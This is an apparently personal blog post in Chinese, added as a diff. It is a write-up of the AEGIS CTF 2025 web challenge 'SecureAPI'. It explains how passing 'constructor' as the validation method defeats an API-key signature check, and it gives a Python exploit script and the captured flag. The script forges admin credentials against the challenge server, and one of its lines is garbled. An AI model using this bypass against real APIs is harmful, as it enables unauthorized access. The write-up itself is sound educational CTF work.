@@ -1,0 +1,137 @@
+---
+title: "AEGIS CTF 2025 WEB : SecureAPI"
+# author: "483"
+description: "2025 神盾杯初賽"
+pubDate: "Oct 01 2025"
+categories: ["CTF-WEB"]
+tags: ["CTF-Writeups", "AEGIS-2025"]
+
+excerpt: "關於 2025 神盾盃初賽 web 題目 SecureAPI 的解題思路"
+---
+
+import AlertBlockquote from "@/components/mdx/AlertBlockquote.astro"; // 用 @/ 代表 src/
+import Color from "@/components/mdx/Color.astro";
+import Details from "@/components/mdx/Details.astro";
+
+# AEGIS CTF 2025 WEB : SecureAPI
+
+## <Color c="red-0">題目</Color>
+
+![image](@assets/blog-images/aegis/secure-api-question.png)
+
+## <Color c="red-0">解題過程</Color>
+
+1. 首先跟進到題目網頁，這裡提到有四個 api endpoint ，明顯要想辦法存取最後一個 endpoint`(/api/admin/flag)` 。前兩個點進去看內容都沒什麼幫助，所以直接進 Code Audit
+
+![image](@assets/blog-images/aegis/api-gateway.png)
+
+&emsp;
+
+2. 底下是 source code 的架構(`exploit.py` 是我的解題 script 不算在內)。從 `app.js` 開始檢查， `authenticateApiKey` 有提到之後發送的 req 中要包含 `Authorization` 這個 headers ，以及定義 `req.apiPayload` 的值是 `validateApiKey(apiKey, secret)` 的結果。到這裡先看 `/api/admin/flag` 會做甚麼，剛剛驗證的 ApiKey 等一下再一次看
+
+   <AlertBlockquote type="info" title="apiKey 的結構">
+     在 `validator.js` 的 `generateApiKey` 中有提到 (`substring(n)` 就是從第 n
+     個開始讀)
+   </AlertBlockquote>
+
+![image](@assets/blog-images/aegis/prob-directory.png)
+![image](@assets/blog-images/aegis/app-js-stub.png)
+![image](@assets/blog-images/aegis/validator-js-stub-1.png)
+
+&emsp;
+
+3. `/api/admin/flag` 這個 endpoint 調用了剛剛介紹的 apiPayload ，接著就是一系列的檢查。 `timeDiff` 要稍微注意一下只有 1 個小時的 expiry 。看起來沒有其他特別的地方，所以看重點 `validator.js`
+
+![image](@assets/blog-images/aegis/admin-js-stub-1.png)
+![image](@assets/blog-images/aegis/admin-js-stub-2.png)
+
+&emsp;
+
+4. `validator.js` 最重要的是選擇驗證 method 的部份，看起來只是用 `validators[someMethod]` 的方式去調用再去比對。但是仔細想一下，在 js 中因為動態屬性存取，有一種特殊技巧——原型汙染 (prototype pollution) ，一般 JS 物件鍊可以寫成 `a.__proto__.b` ，但是也可以改成 `a['__proto__']['b']` 。也就是說我們可以利用 JS 調用物件內方法，修改達到 prototype pollution
+
+![image](@assets/blog-images/aegis/validator-js-stub-2.png)
+![image](@assets/blog-images/aegis/validator-js-stub-3.png)
+
+&emsp;
+
+5. 具體利用方式如下，使用 constructor 這種不受大小寫影響的屬性。當拿到一個封裝物件後，使用 `encodeURIComponent()` 的參數必須要是 primitive (原始型別)，如果把封裝物件放進 `encodeURIComponent()` 就會先將剛剛拿到的封裝物件轉回 primitive (以這裡來說是經過 `.toString()` 轉回字串)，接著才會做 encode
+
+   ```javascript
+   如果在
+   const validator = validators[method.toLowerCase()];
+   把 method 設定為 'constructor'
+
+   結果會變成
+   const validator = validators['constructor'];
+
+   那麼當 server 執行
+       const calculatedSignature = validator(encodedPayload, secret);
+
+   就會變成
+       const calculatedSignature = Object(encodedPayload, secret);
+       ( secret 會被忽略掉， Object() 只吃一個參數 )
+
+   這時的 calculatedSignature 就會是一個 wrapper object (封裝物件)，
+   其存在目的是為了讓 primitive (原始型別)能夠使用方法及屬性
+   ```
+
+- Doc : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/Object
+
+&emsp;
+
+6. 也就是說我只需要把最後的 payload 和 signature 都填一樣的字串，就能夠利用 prototype pollution 通過檢查了， payload 因為要進入 `/api/admin/flag` 被 endpoint 限制了(不能亂填的意思)，所以只需要把 payload 也放進 signature 的欄位就成功了
+
+<Details summary="python 解題 script"> {/* 元件和程式碼區塊之間要空一行*/}
+
+```python
+import requests
+import time # for timestamp
+import json # for encoding payload
+import base64 # for encoding payload
+import urllib
+
+url = "https://aegis2025-secureapi.chals.io/"
+target_path_1 = "api/user/profile"
+target_path_2 = "api/admin/flag"
+
+payload = {
+"user" : "pudding483",
+"timestamp" : int(time.time()) _ 1000, # ms unit, must < 3600 _ 1000
+"api" : "admin/flag",
+"role" : "admin"
+}
+
+# method = "toString"
+
+# We cannot use this since there is Lowercase(),
+
+# and JS attribute match method is case sensitive
+
+method = "constructor"
+
+encoded_payload = base64.b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode()
+
+# json.dumps(payload).encode() convert payload to bytes since b64encode uses byte
+
+# raw_signature = "[object Object]"
+
+# raw_signature = "[object Undefined]"
+
+# encoded_sig = urllib.parse.quote(raw_signature, safe='')
+
+api_key = f"SAPI-v1-{method}-{encoded_payload}-{encoded_payload}"
+
+header = {
+"Authorization" : f"Bearer {api_key}"
+}
+
+res = requests.get(url + target_path_2, headers = header)
+print(f" [*] Res status : {res.status_code}")
+print(f" [*] Res text : {res.text}")
+```
+
+</Details>
+
+![image full](@assets/blog-images/aegis/result.png)
+
+- **flag🚩 : `AEGIS{gr4tz_0n_th3_pr0t0_m3ss_t3ll_m3_wh0_m1ss3d_jsfb0x3?}`**
